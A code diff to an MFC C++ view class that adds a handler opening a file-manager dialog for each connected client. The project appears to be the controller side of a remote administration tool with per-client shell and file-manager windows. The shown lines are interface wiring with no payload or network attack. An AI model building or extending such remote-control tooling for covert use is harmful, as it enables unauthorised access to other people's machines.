@@ -55,9 +55,10 @@ BEGIN_MESSAGE_MAP(CChildView, CWnd)
 	ON_WM_PAINT()
 	ON_MESSAGE(UM_CREAT_LISTCONTROL, OnCreateListCtrl)
 	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
+	ON_MESSAGE(WM_OPENMANAGERDIALOG, OnOpenManagerDialog)
 	ON_MESSAGE(WM_ADDTOLIST, OnAddToList)
 	ON_MESSAGE(WM_REMOVEFROMLIST, OnRemoveFromList)
-	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
+	//ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
 	ON_WM_CREATE()
 	ON_WM_SIZE()
 	ON_WM_CONTEXTMENU()
@@ -355,4 +356,19 @@ void CChildView::OnListctrlmenuDisconnect()
 		return;
 	BYTE	bToken = COMMAND_REMOVE;
 	SendSelectCommand(&bToken, sizeof(BYTE));	
+}
+LRESULT CChildView::OnOpenManagerDialog(WPARAM wParam, LPARAM lParam)
+{
+
+	ClientContext *pContext = (ClientContext *)lParam;
+
+	CFileManagerDlg	*dlg = new CFileManagerDlg(this, m_iocpServer, pContext);
+	// 设置父窗口为卓面
+	dlg->Create(IDD_FILE, GetDesktopWindow());
+	dlg->ShowWindow(SW_SHOW);
+
+	pContext->m_Dialog[0] = FILEMANAGER_DLG;
+	pContext->m_Dialog[1] = (int)dlg;
+
+	return 0;
 }
